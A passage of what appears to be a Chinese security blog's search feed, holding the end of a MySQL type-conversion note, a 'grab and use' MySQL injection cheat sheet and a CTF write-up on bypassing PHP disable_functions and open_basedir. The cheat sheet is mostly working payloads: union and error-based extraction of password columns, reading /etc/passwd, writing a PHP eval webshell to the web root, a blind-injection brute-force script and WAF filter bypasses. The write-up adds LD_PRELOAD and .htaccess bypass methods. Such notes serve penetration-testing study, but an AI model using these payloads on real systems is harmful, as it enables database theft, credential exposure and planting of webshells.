sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select 1=&apos;aaa&apos;,1=&apos;1aaa&apos;,2=&apos;2aaa&apos;,123=&apos;123aaa&apos;,1=1.0;</span><br><span class="line">+---------+----------+----------+--------------+-------+</span><br><span class="line">| 1=&apos;aaa&apos; | 1=&apos;1aaa&apos; | 2=&apos;2aaa&apos; | 123=&apos;123aaa&apos; | 1=1.0 |</span><br><span class="line">+---------+----------+----------+--------------+-------+</span><br><span class="line">|       0 |        1 |        1 |            1 |     1 |</span><br><span class="line">+---------+----------+----------+--------------+-------+</span><br><span class="line">1 row in set, 4 warnings (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select 2 = &apos;a2&apos;;</span><br><span class="line">+----------+</span><br><span class="line">| 2 = &apos;a2&apos; |</span><br><span class="line">+----------+</span><br><span class="line">|        0 |</span><br><span class="line">+----------+</span><br><span class="line">1 row in set, 1 warning (0.00 sec)</span><br></pre></td></tr></table></figure><p>从上边可以看出，字符串转成浮点数时会失败，如果字符串开头为数字，会在字母处截断，只取数字作为转换后的结果，所以<code>username=0</code>时会返回所有的结果，因为插入的数据都不是以数字开头的，转换时都会转成0，0=0，满足条件所以输出。</p><h4 id="sql注入中的利用"><a href="#sql注入中的利用" class="headerlink" title="sql注入中的利用"></a>sql注入中的利用</h4><p>查了查资料，有大佬已经总结过了，陕西省网络安全大赛中出过一道这样的题目，详情可以看<a href="https://www.anquanke.com/post/id/86021" target="_blank" rel="noopener">这里</a></p><h4 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h4><p><a href="https://dev.mysql.com/doc/refman/5.7/en/type-conversion.html" target="_blank" rel="noopener">https://dev.mysql.com/doc/refman/5.7/en/type-conversion.html</a></p><p><a href="https://www.anquanke.com/post/id/86021" target="_blank" rel="noopener">https://www.anquanke.com/post/id/86021</a></p><p><a href="https://www.cnblogs.com/rollenholt/p/5442825.html" target="_blank" rel="noopener">https://www.cnblogs.com/rollenholt/p/5442825.html</a></p>]]></content>
      
      
      <categories>
          
          <category> 安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> sql注入 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>mysql注入备忘录(不断更新...)</title>
      <link href="/2019/08/22/mysql-injection-guide/"/>
      <url>/2019/08/22/mysql-injection-guide/</url>
      
        <content type="html"><![CDATA[<p>记录一下<code>mysql</code>手工注入语句，随拿随用。</p><a id="more"></a><h4 id="常用函数"><a href="#常用函数" class="headerlink" title="常用函数"></a>常用函数</h4><h5 id="查看版本"><a href="#查看版本" class="headerlink" title="查看版本"></a>查看版本</h5><ul><li><code>version()</code></li><li><code>@@version //@@</code>是系统变量</li></ul><h5 id="查看数据库"><a href="#查看数据库" class="headerlink" title="查看数据库"></a>查看数据库</h5><ul><li><code>database()</code></li><li><code>schema()</code></li></ul><h5 id="查看用户"><a href="#查看用户" class="headerlink" title="查看用户"></a>查看用户</h5><ul><li><code>user()</code></li><li><code>current_user()</code></li><li><code>system_user()</code></li></ul><h5 id="查看路径"><a href="#查看路径" class="headerlink" title="查看路径"></a>查看路径</h5><ul><li><code>select @@basedir</code></li></ul><h5 id="字符串相关"><a href="#字符串相关" class="headerlink" title="字符串相关"></a>字符串相关</h5><ul><li><code>length()</code></li><li><code>concat()</code> //连接字符串</li><li><code>concat_ws(flag,s1,s2...)</code> //同<code>concat</code>函数，每个字符要加上<code>flag</code></li><li><code>left(s,n)</code> //返回s开始的最左边n个字符</li><li><code>right(s,n)</code>  //返回s开始的最右边的n个字符</li><li><code>repeat(s,n)</code> //重复字符串s n次</li><li><code>substring(s,n,len)</code>  //获取字符串s从n开始长度为<code>len</code>的字符串</li><li><code>mid(s,n,len)</code>   //同上sub</li><li><code>ascii(s)</code>  // 获取s的<code>ascii</code>值</li><li><code>group_concat()</code> //连接字符串</li></ul><h5 id="条件判断"><a href="#条件判断" class="headerlink" title="条件判断"></a>条件判断</h5><p><code>if(expr,v1,v2)</code>  // 如果表达式成立，执行<code>v1</code>，否则执行<code>v2</code></p><p><code>case when then</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">case expr</span><br><span class="line">when case1 then 1</span><br><span class="line">when case2 then 2</span><br><span class="line">else 3</span><br><span class="line">end case</span><br></pre></td></tr></table></figure><h4 id="注入方式"><a href="#注入方式" class="headerlink" title="注入方式"></a>注入方式</h4><ul><li><p>有回显的普通注入</p></li><li><p>报错注入(有回显)</p></li><li><p>头注入(<code>X-Forwarded-For/UA头/cookie注入/...</code>)</p></li><li><p><code>insert</code>注入</p></li><li><p><code>update</code>注入  // 一般为报错注入</p></li><li><p><code>delete</code> 注入 </p></li><li><p>宽字节注入</p></li><li><p>盲注</p><ul><li><p>布尔盲注</p><p>根据返回结果的差异来判断</p></li><li><p>时间盲注</p><p>根据是否延时来判断条件是否成立</p></li></ul></li><li><p>二次注入</p><ul><li><code>insert + select</code>类型</li><li><code>update + select</code>类型</li><li>…</li></ul></li><li><p><code>order by</code>注入</p></li></ul><h4 id="注入点判断"><a href="#注入点判断" class="headerlink" title="注入点判断"></a>注入点判断</h4><ul><li><p>字符型</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">id =1&apos; and &apos;1&apos;=&apos;1 #</span><br><span class="line">id =1&apos; and &apos;1&apos;=&apos;2 #</span><br><span class="line">id =1&apos; or &apos;1&apos;=&apos;1 #</span><br><span class="line">id =1&apos; or &apos;1&apos;=&apos;2 #</span><br><span class="line"> &apos;  &quot; &apos;) &quot;)   //常见闭合方式</span><br></pre></td></tr></table></figure></li><li><p>数字型</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">id = 1 and 1 =1 #</span><br><span class="line">id = 2 and 1= 2 #</span><br><span class="line">id = 1 or 1 = 1 #</span><br><span class="line">id = 2 or 1 = 2 #</span><br></pre></td></tr></table></figure></li></ul><h4 id="注入语句"><a href="#注入语句" class="headerlink" title="注入语句"></a>注入语句</h4><h5 id="有回显普通手工注入"><a href="#有回显普通手工注入" class="headerlink" title="有回显普通手工注入"></a>有回显普通手工注入</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">id = 1 order by 3#  // 条件为真，才能进行order by 查询</span><br><span class="line">id = -1 union select 1,2,3 # //前面条件为假，而且前后查询列数要相等</span><br><span class="line"></span><br><span class="line">SELECT GROUP_CONCAT(schema_name) FROM INFORMATION_SCHEMA.SCHEMATA #</span><br><span class="line">SELECT GROUP_CONCAT(table_name) FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA=DATABASE() #</span><br><span class="line">SELECT GROUP_CONCAT(table_name) FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA=database_name #</span><br><span class="line">SELECT GROUP_CONCAT(column_name) FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME=table_name # </span><br><span class="line">SELECT GROUP_CONCAT(column_1,column_2) FROM database_name.table_name #</span><br><span class="line">SELECT load_file(&apos;/etc/passwd&apos;)</span><br><span class="line">SELECT &apos;&lt;?php @eval($_POST[1]);?&gt;&apos; into outfile &apos;/var/www/html/shell.php&apos;;</span><br><span class="line">show variables like &apos;%secure%&apos;; // 查看权限</span><br><span class="line">secure_file_priv=  可以读取目录</span><br><span class="line">secure_file_priv=NULL 不能读取</span><br><span class="line">secure_file_priv=C:\  只能读取C盘</span><br></pre></td></tr></table></figure><h5 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h5><h6 id="updatexml-长度限制-32位"><a href="#updatexml-长度限制-32位" class="headerlink" title="updatexml(长度限制 32位)"></a>updatexml(长度限制 32位)</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">id=1 and (updatexml(1,concat(0x7e,(select user()),0x7e),1))</span><br><span class="line">id=1 and (updatexml(1,concat(0x7e,(select database()),0x7e),1))</span><br><span class="line">id=1 and (updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema=&apos;test&apos;),0x7e),1))</span><br><span class="line">id=1 and (updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema=&apos;test&apos; and table_name=&apos;user&apos;),0x7e),1))</span><br><span class="line"> id=1 and (updatexml(1,concat(0x7e,(select group_concat(password) from user),0x7e),1))</span><br></pre></td></tr></table></figure><h6 id="floor"><a href="#floor" class="headerlink" title="floor"></a>floor</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1 and(select 1 from(select count(*),concat((select (select (SELECT distinct concat(0x7e,table_name,0x7e) FROM information_schema.tables where table_schema=database() LIMIT 0,1)) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)</span><br></pre></td></tr></table></figure><h6 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exp(~(select * from(select group_concat(table_name) from information_schema.tables where !(table_schema &lt;&gt; database()))a)) or &apos;</span><br></pre></td></tr></table></figure><h6 id="extractvaluel-长度限制-32位"><a href="#extractvaluel-长度限制-32位" class="headerlink" title="extractvaluel(长度限制 32位)"></a>extractvaluel(长度限制 32位)</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">id=1 and (extractvalue(1,concat(0x7e,(select user()),0x7e)))</span><br><span class="line">id=1 and (extractvalue(1,concat(0x7e,(select database()),0x7e)))</span><br><span class="line">id=1 and (extractvalue(1,concat(0x7e,(select table_name from information_schema.tables where table_schema=&apos;test&apos;),0x7e)))</span><br><span class="line">id=1 and (extractvalue(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema=&apos;test&apos; and table_name=&apos;user&apos;),0x7e)))</span><br><span class="line">id=1 and (extractvalue(1,concat(0x7e,(select group_concat(password) from user),0x7e)))</span><br></pre></td></tr></table></figure><h5 id="盲注"><a href="#盲注" class="headerlink" title="盲注"></a>盲注</h5><p><code>BENCHMARK(100000,MD5(1)) or sleep(5)</code></p><p>附上一个半成品吧，根据情况定制payload。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import string</span><br><span class="line">import time</span><br><span class="line">import base64</span><br><span class="line"></span><br><span class="line">result = &apos;&apos;</span><br><span class="line">flag=the symbol of successful_data</span><br><span class="line">url = &quot;http:/xxx.com/index.php&quot;</span><br><span class="line">request = requests.session()</span><br><span class="line">prox = &#123;&quot;http&quot;:&quot;127.0.0.1:8080&quot;&#125;</span><br><span class="line">header=&#123;</span><br><span class="line"></span><br><span class="line">&quot;Host&quot;: &quot;test.dns.outnet&quot;,</span><br><span class="line">&quot;User-Agent&quot;: &quot;Mozilla/5.0 (Windows NT 10.0; WOW64; rv:46.0) Gecko/20100101 Firefox/46.0&quot;,</span><br><span class="line">&quot;Accept&quot;: &quot;text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8&quot;,</span><br><span class="line">&quot;Accept-Language&quot;: &quot;zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3&quot;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">data=&#123;</span><br><span class="line">    &quot;username&quot;:&quot;admin&quot;</span><br><span class="line">&#125;</span><br><span class="line">for i in range(1,50):</span><br><span class="line">    for j in range(23,126):</span><br><span class="line"></span><br><span class="line">        payload = &quot; &apos; or ascii(substr((select group_concat(column_name) from information_schema.columns where table_name=the_name_of_table),&#123;0&#125;,1))=&#123;1&#125;  # &quot;.format(i,j)</span><br><span class="line">        #payload = &quot; &apos; or ascii(substr((select a from b),&#123;0&#125;,1))=&#123;1&#125;  # &quot;.format(i,j)</span><br><span class="line">        response = request.post(url=url,data=data,proxies=prox)</span><br><span class="line">        time.sleep(1)</span><br><span class="line">        if flag in response.text:</span><br><span class="line">            result += chr(j)</span><br><span class="line">            print(t)</span><br><span class="line">            break</span><br></pre></td></tr></table></figure><h5 id="DNSlog无回显注入"><a href="#DNSlog无回显注入" class="headerlink" title="DNSlog无回显注入"></a>DNSlog无回显注入</h5><p>没实践过，先记一下。</p><p><a href="https://www.cnblogs.com/afanti/p/8047530.html" target="_blank" rel="noopener">https://www.cnblogs.com/afanti/p/8047530.html</a></p><h4 id="绕过方式"><a href="#绕过方式" class="headerlink" title="绕过方式"></a>绕过方式</h4><h5 id="过滤空格"><a href="#过滤空格" class="headerlink" title="过滤空格"></a>过滤空格</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">/**/ /*!*/</span><br><span class="line"></span><br><span class="line">union/**/select</span><br><span class="line">/*！union*/select</span><br></pre></td></tr></table></figure><h5 id="过滤关键字"><a href="#过滤关键字" class="headerlink" title="过滤关键字"></a>过滤关键字</h5><p>双写或者大小绕过</p><p><code>e.g:</code></p><p><code>Uniunionon</code> <code>SeleSElectct</code></p><h5 id="过滤逗号"><a href="#过滤逗号" class="headerlink" title="过滤逗号"></a>过滤逗号</h5><p>使用<code>join</code>函数代替</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">select 1,2,3</span><br><span class="line">select (select 1)a join (select 2)b join (select 3)c</span><br></pre></td></tr></table></figure><h5 id="过滤单引号"><a href="#过滤单引号" class="headerlink" title="过滤单引号"></a>过滤单引号</h5><p>使用十六进制编码</p><h5 id="正则匹配最大次数限制"><a href="#正则匹配最大次数限制" class="headerlink" title="正则匹配最大次数限制"></a>正则匹配最大次数限制</h5><p>绕某些<code>WAF</code>时有奇效</p><p><a href="https://www.leavesongs.com/PENETRATION/use-pcre-backtrack-limit-to-bypass-restrict.html" target="_blank" rel="noopener">https://www.leavesongs.com/PENETRATION/use-pcre-backtrack-limit-to-bypass-restrict.html</a></p><h4 id="杂七杂八"><a href="#杂七杂八" class="headerlink" title="杂七杂八"></a>杂七杂八</h4><p>查询字段名为关键字时需要使用反引号转义</p><p>数据库数据可能存在宽字节，需要转成十六进制再转成十进制。</p><p>….</p><p>推荐破哥总结的注入笔记，破哥出品，必定精品~</p><p><a href="https://p0sec.net/index.php/archives/117/" target="_blank" rel="noopener">https://p0sec.net/index.php/archives/117/</a></p>]]></content>
      
      
      <categories>
          
          <category> 安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> sql注入 </tag>
            
            <tag> web安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>一个shell引发的思考</title>
      <link href="/2019/08/18/shell-analy/"/>
      <url>/2019/08/18/shell-analy/</url>
      
        <content type="html"><![CDATA[<h4 id="起因"><a href="#起因" class="headerlink" title="起因"></a>起因</h4><p>最近在做内部靶场平台题目，其中一道题为爆破一句话木马，拿到key的值。</p><a id="more"></a><h4 id="经过"><a href="#经过" class="headerlink" title="经过"></a>经过</h4><p>木马密码可以通过burp爆破得到</p><p><img src="https://boombao.oss-cn-beijing.aliyuncs.com/20190818120456.png" alt></p><p>祭出菜刀，连上一句话，发现权限被限制的很死，基本关于文件操作以及命令执行的函数都被禁用了..</p><p><img src="https://boombao.oss-cn-beijing.aliyuncs.com/20190818120834.png" alt></p><p><img src="https://boombao.oss-cn-beijing.aliyuncs.com/20190818120911.png" alt></p><p>但是没有禁用<code>file_get_contents</code>函数，所以可以直接读取文件获得key。</p><p>如果在实际中遇到这种环境，函数被禁，怎么绕过<code>disable_function</code>？</p><p>绕过姿势，一般有这么几种：</p><ul><li><p>寻找未被禁用的函数</p></li><li><p>系统组件绕过</p></li><li><p>通过<code>LD_PRELOAD</code>绕过</p></li><li><p><code>mod-cgi</code> 绕过</p></li><li><p>执行自定义语句(自己实现函数功能，通过<code>webshell</code>执行)</p></li></ul><h5 id="第一种-敏感函数"><a href="#第一种-敏感函数" class="headerlink" title="第一种  敏感函数"></a>第一种  敏感函数</h5><p>整理一下经常用的各类函数，方便查找。</p><p><code>php</code>中读取文件可以使用以下函数：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">readfile</span><br><span class="line">fread</span><br><span class="line">file_get_contents</span><br><span class="line">var_dump(file(file_name)) // file函数返回值位数组</span><br><span class="line">show_source</span><br><span class="line">hightlight_file</span><br><span class="line">......</span><br></pre></td></tr></table></figure><p>在<code>php</code>中可以执行命令函数有：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">system,exec,shell_exec,passthru，pcntl_exec,shell_exec,mail,imap_open,imap_mail,putenv,ini_set,apache_setenv,symlink,link</span><br></pre></td></tr></table></figure><p>列目录函数：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">opendir</span><br><span class="line">scandir</span><br><span class="line">glob(&apos;*&apos;) </span><br><span class="line">$path = dirname(__FILE__);</span><br><span class="line">$result = glob($path.&apos;/*.php&apos;);</span><br><span class="line">print_r($result);</span><br><span class="line">...</span><br></pre></td></tr></table></figure><h5 id="第二种-三方组件"><a href="#第二种-三方组件" class="headerlink" title="第二种 三方组件"></a>第二种 三方组件</h5><p>利用系统存在的组件漏洞执行命令，扩大战果。</p><ul><li>Bash漏洞导致命令执行</li><li><code>ImageMagic</code>绕过</li><li><code>imagecreatefromgd2</code></li><li><code>sendmail</code> </li></ul><h5 id="第三种-LD-PRELOAD"><a href="#第三种-LD-PRELOAD" class="headerlink" title="第三种 LD_PRELOAD"></a>第三种 LD_PRELOAD</h5><p>使用<code>LD_PRELOAD</code></p><p>程序执行时要在动态链接库<code>.so</code>中寻找函数位置，这种绕过方式就是让程序去执行自定义的动态链接库，类似于<code>mysql</code>下的<code>udf</code>提权或者<code>redis</code>主从复制<code>RCE</code>方式。</p><p><code>LD_PRELOAD</code>这个全局变量指定动态链接库文件，会在程序运行之前加载。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">export LD_PRELOAD = XXX/xx.so</span><br></pre></td></tr></table></figure><p>如果可以上传文件，我们可以通过上传一个恶意的.so库文件，然后加载该文件。最后绕过<code>php</code>层面执行命令函数。</p><p>推荐一个复现环境：</p><p><a href="https://github.com/obolu/Bypass_Disable_functions" target="_blank" rel="noopener">https://github.com/obolu/Bypass_Disable_functions</a></p><h5 id="第四种-mod-cgi-htaccess"><a href="#第四种-mod-cgi-htaccess" class="headerlink" title="第四种  mod_cgi+.htaccess"></a>第四种  mod_cgi+.htaccess</h5><p>在启用<code>mod_cgi</code>的apache服务器中，必须允许<code>.htaccess</code>以及有可写权限，要求有点苛刻。</p><p>在apache配置中有<code>Options</code>以及<code>Addhandler</code>指令，前者用来控制目录选项，比方说是否允许目录遍历，是否允许访问等，后者用来指定特定后缀名的文件所对应的处理方式，在解析漏洞中就有这样的用法，上传带少见后缀的恶意文件，修改<code>.htaccess</code>文件达到执行代码的目的。</p><p>这种绕过方式就是通过将要执行的程序写入带有特定拓展名的文件内，修改<code>.htaccess</code>文件，将恶意文件交给<code>cgi</code>处理。</p><p>具体的原理可以查阅 <a href="https://www.cnblogs.com/hookjoy/p/8988862.html" target="_blank" rel="noopener">https://www.cnblogs.com/hookjoy/p/8988862.html</a></p><h5 id="第五种-自定义语句"><a href="#第五种-自定义语句" class="headerlink" title="第五种 自定义语句"></a>第五种 自定义语句</h5><p>通过编写<code>php</code>代码，用<code>php</code>最基础的底层函数实现一些被禁用的函数。</p><p>在本题目中，常见的列目录函数被禁用，包括<code>readdir</code>，<code>opendir</code>等函数，可以使用自定义语句列目录，也可以使用<code>scandir</code>函数。</p><p><img src="https://boombao.oss-cn-beijing.aliyuncs.com/20190818152208.png" alt></p><p>想到可以读其他路径文件，说不定可以读到一些服务器的敏感信息啥的，看一下<code>phpinfo</code>中的<code>open_basedir</code>配置，限定了访问目录，只能访该题目所在目录。</p><p>查阅资料后发现，可以通过<code>glob</code>伪协议绕过限制，读取栏目。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$path = dirname(__FILE__);</span><br><span class="line">$result = glob($path.&apos;/*.php&apos;);</span><br><span class="line">print_r($result);</span><br><span class="line"></span><br><span class="line">//简化版</span><br><span class="line">$a = &quot;glob:///*&quot;;print_r(scandir($a));</span><br></pre></td></tr></table></figure><p><img src="https://boombao.oss-cn-beijing.aliyuncs.com/20190818152937.png" alt></p><p>可以看到读到了根目录，但是没有足够权限读取/root/下的文件。需要借助其他的方式提升权限。</p><p>最后发现该靶机是一台虚拟主机之类的单独空间，没有其他题目的key，== ！ 姜还是老的辣啊2333</p><p>最后附上<code>l3m0n</code>大佬的<code>github</code>链接，里边记录了各种绕过姿势</p><p><a href="https://github.com/l3m0n/Bypass_Disable_functions_Shell" target="_blank" rel="noopener">https://github.com/l3m0n/Bypass_Disable_functions_Shell</a></p><h4 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h4><p><a href="https://www.anquanke.com/post/id/175403" target="_blank" rel="noopener">https://www.anquanke.com/post/id/175403</a></p><p><a href="https://www.tr0y.wang/2018/04/18/PHPDisalbedfunc/index.html" target="_blank" rel="noopener">https://www.tr0y.wang/2018/04/18/PHPDisalbedfunc/index.html</a></p>]]></content>
      
      
      <categories>
          
          <category> 安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> webshell </tag>
            
            <tag> 渗透测试 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
